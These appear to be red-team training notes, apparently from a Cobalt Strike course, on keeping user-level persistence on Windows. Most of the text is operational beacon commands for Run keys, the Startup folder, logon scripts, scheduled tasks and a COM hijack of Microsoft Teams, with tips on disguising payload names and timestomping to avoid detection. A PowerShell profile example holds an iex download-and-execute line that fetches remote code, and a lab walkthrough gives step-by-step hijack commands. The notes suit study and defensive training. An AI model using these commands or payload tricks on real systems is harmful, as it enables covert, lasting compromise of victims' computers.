_Persistence_ is a tactic used to maintain access to a compromised system across reboots and other interruptions.

To avoid conflating techniques, this section will solely cover userland persistence techniques and elevated techniques are covered in [[6 Elevated Persistence]]
## Boot & Logon Autostart
Boot or Logon Autostart Execution is a collection of techniques [[T1547](https://attack.mitre.org/techniques/T1547/)] where an adversary configures the computer to automatically execute a payload during startup, or when a user logs in.

#### Registry Run Keys
Registry contain multiple keys that allow programs to run when a user logs in

2 Common Ones
```bash
HKCU\Software\Microsoft\Windows\CurrentVersion\Run    # Every reboot  
HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce# Deletes after 1 run
```

Modify Registry Keys from Cobalt Strike
```bash
# Uploading persistence payload
# OPSEC NOTE: name payload msedge.exe in the first place to avoid detection
beacon> cd C:\Users\pchilds\AppData\Local\Microsoft\WindowsApps
beacon> upload C:\Payloads\http_x64.exe  
beacon> mv http_x64.exe updater.exe  

# Modify Registry key
beacon> reg_set HKCU Software\Microsoft\Windows\CurrentVersion\Run Updater REG_EXPAND_SZ %LOCALAPPDATA%\Microsoft\WindowsApps\<updater.exe>

# Verify modification
beacon> reg_query HKCU Software\Microsoft\Windows\CurrentVersion\Run Updater

# Delete when no longer required
reg_delete
```

#### Startup Folder
Programs in the user's startup folder will also run automatically on login.

Location:
	`%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup`


Modifying User's Startup Folder
```bash
# OPSEC NOTE: name payload msedge.exe in the first place to avoid detection
beacon> cd C:\Users\pchilds\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
beacon> upload C:\Payloads\http_x64.exe
beacon> mv http_x64.exe updater.exe
```

## Logon Script
The `HKCU\Environment` registry key contains the user's environment variables, such as `%Path%` and `%TEMP%`.  An adversary can add another value to this key called `UserInitMprLogonScript` [[T1037.001](https://attack.mitre.org/techniques/T1037/001/)].  

As with the autorun keys, this value should contain the path to a program, then it will execute automatically when the user logs in.

```bash
# OPSEC NOTE: name payload msedge.exe in the first place to avoid detection
# upload
beacon> cd C:\Users\pchilds\AppData\Local\Microsoft\WindowsApps\
beacon> upload C:\Payloads\<payload.exe>

# set reg value
beacon> reg_set HKCU Environment UserInitMprLogonScript REG_EXPAND_SZ %USERPROFILE%\AppData\Local\Microsoft\WindowsApps\<payload.exe>

```

## PowerShell Profile
A PowerShell profile, `profile.ps1`, is a script that executes when PowerShell windows are opened by a user. Adversaries can modify user profile to execute malicious code.

Microsoft publishes locations where these profiles can be created for [PowerShell](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_profiles?view=powershell-5.1) and [PowerShell Core](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_profiles?view=powershell-7.4)
	Example:
		`$HOME\Documents\WindowsPowerShell\Profile.ps1`
	NOTE:
		If directory doesn't exist, create it

Any code in profile must not ask for prompts as user will not be able to confirm them
	Workaround:
		`Start-Job` cmdlet
		Example:
			`$_ = Start-Job -ScriptBlock { iex (new-object net.webclient).downloadstring("http://bleepincomputer.com/a") }`

Uploading PowerShell Profile
```bash
beacon> cd C:\path\to\WindowsPowerShell
becon> upload C:\path\to\Profile.ps1
```

## Scheduled Task
The Windows Task Scheduler is able to perform routine tasks based on pre-defined triggers.

The `schtaskscreate` BOF (beacon object file) can create scheduled tasks from a given XML task definition.

Example XML Task to use (Save this somewhere on ATTACK box)
```XML
<!-- replace updater.exe with payload name, like msedge.exe, or a cmd! -->
<!-- replace UserID value-->
<Task xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Triggers>
    <LogonTrigger>
      <Enabled>true</Enabled>
      <UserId>CONTOSO\pchilds</UserId>
    </LogonTrigger>
  </Triggers>
  <Principals>
    <Principal>
      <UserId>CONTOSO\pchilds</UserId>
    </Principal>
  </Principals>
  <Settings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
  </Settings>
  <Actions>
    <Exec>
      <Command>%LOCALAPPDATA%\Microsoft\WindowsApps\updater.exe</Command> 
    </Exec>
  </Actions>
</Task>
```

Scheduling Tasks from within Cobalt Strike
```powershell
beacon> cd C:\Windows\System32
beacon> upload C:\Payloads\beacon_x64.exe  # OPSEC PLEASE, ie updater.exe

# Create schtask
beacon> schtaskscreate \<name> XML CREATE # replace "Beacon" 
	# schtaskscreate \Microsoft\Windows\WindowsUpdate\Updater XML CREATE
		# This will open prompt to select XML file to use to schedule

# Delete task if done with it
beacon> schtasksdelete <name> TASK
```

## COM Hijacking
COM hijacking is a technique where an adversary can change or leverage a COM entry to trick an application into loading/executing their malicious code.

2 ways to achieve this
	Partially missing COM entries
	If COM entry points to DLL or EXE that doesn't exist on disk, and location is writable
#### Summarizing COM
Component Object Model (COM) provides an interoperability standard so that applications written in different languages can reuse the same software libraries.

COM exposes its features through interfaces. Take the following C# as an example:
```C#
interface IMyInterface
{
    string MyMethod(string myInput);
}
```

This interface defines the method that a caller can invoke. A library that implemented this interface could look something like this:
```C#
class MyImplementation : IMyInterface
{
    public string MyMethod(string myInput)
    {
        Console.WriteLine(myInput);
        return $"You said: {myInput}.";
    }
}
```

In COM nomenclature, a "component" (also known as a "COM object") is an interface and its associated implementation (i.e. the actual working code behind the interface)

Every COM object is tracked in the registry by a unique identifier called a CLSID (which are just GUIDs).
	Found in `HKEY_CLASSES_ROOT\CLSID`
	![[Pasted image 20251220183122.png]]

Under each entry, you will find another key called **InProcServer32** or **LocalServer32**
	**InProcServer32** : path to DLL
	**LocalServer32** : path to EXE
	These values provide the COM functionality


#### Finding COM Hijacks
 The trick with COM hijacking is to find an object that:
    Doesn't break loads of software, or even the entirety of Windows, when hijacked. 
    Isn't loaded a bazillion times a minute, which would render the system inoperable.

How to identify COM hijacks?
	ProcMon!

ProcMon filters to use
	_Operation_ = RegOpenKey
	_Path_ contains InprocServer32 or LocalServer32
	Result = NAME NOT FOUND
	![[Pasted image 20251220183832.png]]
	Consider exporting to CSV for frequency analysis

Example COM Object RastaMouse has used in the past; Loaded by DllHost.exe
	`HKCU\Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32`

After hijack, every time the COM object is called, a beacon will spawn because of your payload being inserted into the registry

Example COM Hijack
```PowerShell
RESEARCH PHASE
_________________________________________________________________________
1. # First identify software the Victim has, such as Teams

2. ## Identify potential bad COM Object via ProcMon & filters on ATTACKER box!!! -- dont wanna be noisy on victim box yet
# look for CLSIDs with 1 entry or so...
# See ProcMon filters above on how to do this

3. ## Identify if key is missing for it
# HKLM
PS C:\Users\Attacker> Get-Item -Path "HKLM:\Software\Classes\CLSID\{CLSID}\InprocServer32"
	# PRESENT

# HKCU
PS C:\Users\Attacker> Get-Item -Path "HKCU:\Software\Classes\CLSID\{CLSID}\InprocServer32"
	# NOT PRESENT, we can proceed

4. ## Testing the COM Hijack
# Create registry key for given CSLID and InprocServer32 value (or LocalServer32 in case of EXE)
PS C:\Users\Attacker> New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{CLSID}"
PS C:\Users\Attacker> New-Item -Path "HKCU:Software\Classes\CLSID\{CLSID}" -Name "InprocServer32" -Value "C:\Payloads\http_x64.dll" 
PS C:\Users\Attacker> New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{CLSID}\InprocServer32" -Name "ThreadingModel" -Value "Both"

5. ## Restart process, look for beacon in Team Server. If successful, proceed to modifying on victim box
# Remove registry keys from attack box 
PS C:\Users\Attacker> Remove-Item -Path "HKCU:Software\Classes\CLSID\{CLSID}" -Recurse -Force
   
PERSISTENCE/ATTACK PHASE
_________________________________________________________________________

6. # Interact with VICTIM beacon
   
7. # Change Beacons working directory to vulnerable application AppData
beacon> cd C:\Users\VICTIM\AppData\Local\Microsoft\TeamsMeetingAdd-in\1.25.14205\x64  # this is an example of MS Teams
beacon> ls         # Make note of .dll name formatting

8. # Upload DLL payload to disk. NOTE: OPSEC PLEASE
beacon> upload C:\path\<payload.dll>  # rename this to match .dlls on disk

9. # Timestomp for OPSEC
beacon> timestomp <payload.dll> <REAL.dll> 

10. # Add registry entries
beacon> reg_set HKCU "Software\Classes\CLSID\{CLSID}\InprocServer32" "" REG_EXPAND_SZ "%LocalAppData%\Microsoft\TeamsMeetingAdd-in\1.25.14205\x64\<MALICIOUS.dll>" # SWAP OUT <MALICIOUS.DLL> W/ NAME OF PAYLAOD .DLL
beacon> reg_set HKCU "Software\Classes\CLSID\{CLSID}\InprocServer32" "ThreadingModel" REG_SZ "Both"
```
Next time the program is run, we will get a beacon!!!!!

## Lab
#### CLSID Lab
Note: This first section is to determine COM objects can be abused on our Attacked box, to then REPLICATE on the victim box

1.  On the Attacker Desktop, run _C:\Tools\SysinternalsSuite\Procmon64.exe_ as a local admin.
    
2.  Select **Filter > Filter** (or use **Ctrl + L**).
    
3.  Add the following filters:
    
    1.  Process Name is ms-teams.exe then Include.
    2.  Operation is RegOpenKey then Include.
    3.  Path ends with InprocServer32 then Include.
    4.  Result is NAME NOT FOUND then Include.
    5.  Click OK.
4.  Run Microsoft Teams from the Windows Start Menu and observe the events in Process Monitor.
    
    > You want a CLSID that is only called a few times. We'll use **7D096C5F-AC08-4F1F-BEB7-5C22C517CE39** in this lab.
    
5.  Quit Teams from the taskbar.
    
6.  Use PowerShell to add the following registry entries and test the hijack:
    
    powershellTypeCopy
    
    `New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{7D096C5F-AC08-4F1F-BEB7-5C22C517CE39}" New-Item -Path "HKCU:Software\Classes\CLSID\{7D096C5F-AC08-4F1F-BEB7-5C22C517CE39}" -Name "InprocServer32" -Value "C:\Payloads\http_x64.dll" New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{7D096C5F-AC08-4F1F-BEB7-5C22C517CE39}\InprocServer32" -Name "ThreadingModel" -Value "Both"`
    
7.  Launch Cobalt Strike and connect to the Team Server.
    
8.  Run Microsoft Teams again and a Beacon should appear, running in ms-teams.exe.

#### Persistent on the target

From the Beacon running as pchilds:

1.  Change Beacon's working directory.
    
    1.  cd C:\Users\pchilds\AppData\Local\Microsoft\TeamsMeetingAdd-in\1.25.14205\x64
2.  Upload the DLL payload to disk.
    
    1.  upload C:\Payloads\http_x64.dll
3.  Rename and timestomp the DLL to help it blend in.
    
    3.  mv http_x64.dll Microsoft.Teams.HttpClient.dll
    4.  timestomp Microsoft.Teams.HttpClient.dll Microsoft.Teams.Diagnostics.dll
4.  Add the registry entries.
    
    BeaconTypeCopy
    
    `reg_set HKCU "Software\Classes\CLSID\{7D096C5F-AC08-4F1F-BEB7-5C22C517CE39}\InprocServer32" "" REG_EXPAND_SZ "%LocalAppData%\Microsoft\TeamsMeetingAdd-in\1.25.14205\x64\Microsoft.Teams.HttpClient.dll" reg_set HKCU "Software\Classes\CLSID\{7D096C5F-AC08-4F1F-BEB7-5C22C517CE39}\InprocServer32" "ThreadingModel" REG_SZ "Both"`
    
5.  Switch to [Workstation 1](https://labclient.labondemand.com/Instructions/99a3a125-c2b4-4e4c-9116-48b5e60bb1e4#) and login with Passw0rd!.
    
6.  Run Microsoft Teams.
    
7.  Switch back to the [Attacker Desktop](https://labclient.labondemand.com/Instructions/99a3a125-c2b4-4e4c-9116-48b5e60bb1e4#) and a new Beacon should appear.